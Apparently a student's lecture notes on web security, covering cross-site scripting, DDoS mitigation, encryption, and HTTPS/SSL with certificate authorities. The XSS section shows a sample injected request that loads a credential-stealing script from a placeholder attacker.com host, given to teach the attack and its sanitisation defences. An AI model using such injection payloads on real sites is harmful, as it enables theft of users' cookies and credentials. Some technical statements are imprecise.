# Web Security Lecture

## Notes

Cross Site Scripting:

- Attacker inserts arbitrary HTML on web page
    - How can this ever happen?

- What can go wrong
    - Change content of page
    - Steal user's info

- What if HTML includes < script > tags?
    - Replace page w/ new one
        - Fake instance of page 2 get passwords, accounts, etc.
    
    - Pass info from page to foreign page
        - Cookies, passwords, credit card numbers, session IDs
    
    - Download user's cookies (passwords) for other sites.

How?

- Request:
GET/welcome.php?name=Robbie20%Culkin

Host www.vulnerable.site

- Response: 
< HTML >
    < Title > Welcome! < /Title >
    Hi Robbie Culkin
    < br >
    Welcome to our system
    ...
< /HTML >

Attacker provides link & victim, upon clicking it, will generate request to www.vulnerable.site as follows:

GET/welcome.php?name=< script >src="http://attacker.com/auth.stealer.js"< /script >
Host: www.vulnerable.site

Response:
< HTML >
    < Title >Welcome!< /Title >
    Hi < script >
    src="http://attacker.com/auth.stealer.js"
    < /script >
    < br >
Welcome to our system
...
< /HTML >

Victim's client browser interprets response as HTML page containing piece of malicious JavaScript code.

Mitigation:
- Don't allow any HTML to be inserted.
    - Backend libraries to strip out HTML tags

- Don't allow malicious HTML to be inserted
    - Backend libraries to sanitize HTML
        - Limited set of allowed formatting tags

- Similar techniques may be used to protect against SQL injection.

Distributed Denial of Service (DDoS):

Overwhelm server w/ malicious requests to block regular users.

- Requests don't come from 1 machine
    - Easily blocked

- Attacker uses # of controlled machines, often compromised
    - Hard to spot

Mitigation:
- Rate limiting
    - Limit volume of requests from a user

- Throw out excess traffic @ random
    - Some malicious, some legitimate

- Distribute traffic across network
    - By distributing load, can accommodate huge volume.

Network Security:

- Send requests: GET/POST
- Send responses: HTML documents
- Network channels not necessarily secure

- Confidentiality: What if someone interprets & reads message?
- Integrity: What if someone intercepts & alters message?

Secure Communication:

- Anyone other than interpreted recipient, we want our message to be:
    - Unreadable
    - Impossible to change w/o detection

- Encryption function:
    -F(X) = Y easy to compute
    -F(Y)^-1 = X difficult to compute (w/o additional knowledge)

Encryption & Decryption:

- Encryption
    - Ensures privacy w/in organization & be on Internet
    - Conversion of data into unreadable form, called ciphertext

- Decryption
    - Process of converting ciphertext back into its OG form, called plaintext or cleartext, so it can be understood.

- Requires algorithm key.

Types:

- 2 encryption types:
    - Symmetric-key Encryption
    - Asymmetric-key Encryption

- SSL (Secure Sockets Layers)
    - Uses both encryption types
    - Provides 4 secure transmission of data on Internet

Browser-Server Communication:

- Can use encrypted communication in a web app
    - HTTPS represents encrypted (secure) connection

- HTTPS secure HTTP
    - Data passed back & forth encrypted
    - Browser & server agree on key
    - Encryption's then done based on key
    - Handled by Secure Sockets Layer (SSL)

HTTPS Connections:

- Browser makes connection to server
- SSL handshake protocol
    - Browser sends & requests certificate
        - Certificates effectively keys can be verified as authentic
        - This is 1 way public key systems r used.
    
    - Server replies w/ certificate of its own

- SSL change cipher protocol
    - Browser & server use their certificates to agree on key
    - Again using variant of public key systems

- Communication done securely using key (symmetric key encryption)
    - Key only used for particular session

HTTPS usage:

- If sending confidential info
    - Passwords
    - Payment info
    - Should use HTTPS

- OpenSSL & other implementations exist
    - Typically built into server & browser
    - Different port used 4 secure communication

Secure Socket Layer (SSL):

- Protocol allows data to be privately exchanged over public networks
- Developed by Netscape
- Encrypts data sent b/w client (usually Web browser) & Web server
- Utilizes both symmetric & asymmetric keys.
- "https" http over SSL
- Browsers display "lock" icon

- Provides secure communication b/w client & server by using:
    - Server & client digital certificates 4 authentication
    - Symmetric-key cryptography using "session key" 4 bulk encryption
    - Public-key cryptography 4 transfer of session

Digital Certificate:

- Form of assymetric key
- Also contains info about certificate, holder of certificate & issuer of certificate
- Used by SSL to authenticate identity of web server

Content includes:
    - Public key
    - Effective date of certificate
    - Expiration date of certificate
    - Details about Certificate Authority--issuer of certificate
    - Details about certificate holder
    - Digest of certificate content

Certificate Authority:

- Trusted 3rd-party organization or company issued digital certificates
- Well-known Certificate Authorities:
    - IdenTrust
    - DigiCert
    - GTS

CA Communication Process:

- Web server sends its public key w/ its certificate.
- Browser checks that certificate was issued by trusted CA, that certificate's still valid & certificate's related to site contacted.
- Browser then uses public key to encrypt random symmetric encryption key & sends it to server w/ encrypted HTTP request.
- Web server decrypts symmetric encryption key using its private key & uses symmetric key to decrypt HTTP request.
- Web server sends back requested HTML document & HTTP data encrypted w/ symmetric key.
- Browser decrypts HTTP data & HTML document using symmetric key & displays key info.